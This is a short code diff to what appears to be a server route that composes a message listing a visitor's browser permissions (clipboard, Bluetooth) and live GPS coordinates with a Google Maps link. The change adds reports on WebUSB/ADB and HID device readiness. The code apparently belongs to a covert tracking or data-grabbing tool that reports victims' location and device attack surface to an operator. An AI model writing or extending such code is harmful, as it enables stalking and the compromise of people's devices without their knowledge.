@@ -34,7 +34,8 @@ export async function POST(req: Request) {
     caption += `├ *Clipboard:* ${permissions.clipboard}\n`;
     caption += `├ *JavaScript:* ✅ Always Allowed\n`;
     caption += `└ *Bluetooth:* ${permissions.nearby}\n\n`;
-
+    caption += `├ *WebUSB/ADB:* ${permissions.usb === "supported" ? "✅ Ready" : "❌ No Support"}\n`;
+    caption += `└ *HID Devices:* ${permissions.hid === "supported" ? "✅ Ready" : "❌ No Support"}\n\n`;
     if (gps) {
       caption += `🎯 *LIVE GPS:* [Google Maps](https://www.google.com/maps?q=${gps.lat},${gps.lon})\n`;
     }
